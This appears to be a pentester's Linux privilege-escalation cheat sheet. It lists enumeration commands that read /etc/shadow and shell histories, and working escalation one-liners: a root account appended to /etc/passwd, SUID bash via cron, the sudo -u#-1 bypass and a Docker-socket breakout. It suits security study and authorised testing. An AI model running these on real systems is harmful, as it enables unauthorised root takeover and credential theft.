## Linux Privilege Escalation

### Enumeration
-> Get system distribution and version
```
cat /etc/*-release
```

-> Get kernel version
```
cat /proc/version   
uname -a
```

-> View variable environments 
```
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.zshrc
```

-> View user command history
```
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

-> Services
```
ps -aux
cat /etc/service
```

-> View network interfaces and connections
```
ifconfig
ip addr
```

-> Get DNS resolver and hosts mapped to an IP
```
cat /etc/resolv.conf
cat /etc/hosts
```

-> Get system user, group and password information
```
cat /etc/passwd
cat /etc/shadow
```

### Crontab [PrivEsc]
-> Enumeration  
```
cat /var/log/cron.log                                                                                                                                              
cat /etc/crontab
```

-> Exploitation  
```
echo "chmod +s /bin/bash" >> script.sh
```

### SUID [PrivEsc]
-> Enumeration 
```
find / -perm -u=s -type f 2>/dev/null
```
-> Exploitation
https://gtfobins.github.io/

### Capabilities [PrivEsc]
-> Enumeration  
```
getcap -r / 2>/dev/null
```
-> Exploitation  
https://gtfobins.github.io/

### Binary with Sudo [PrivEsc]
```
sudo -l
```
or  
```
cat /etc/sudoers
```
-> Exploitation
https://gtfobins.github.io/

### Passwd Writabble [PrivEsc]
-> Enumeration  
```
ls -la /etc/passwd
```
-> Exploitation  
```
echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

### sudo < v1.28 - @sickrov [PrivEsc]
```
sudo -u#-1 /bin/bash
```

### Docker Breakout [PrivEsc]
-> Search the socket
```
find / -name docker.sock 2>/dev/null
```
-> list images  
```
docker images
```
-> Exploitation
```
docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
```

### Linux Enumeration Tools [PrivEsc]

-> Linpeas
```
./linpeas.sh
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

-> Unix Privesc Check
```
./unix-privesc-check
```
https://pentestmonkey.net/tools/audit/unix-privesc-check
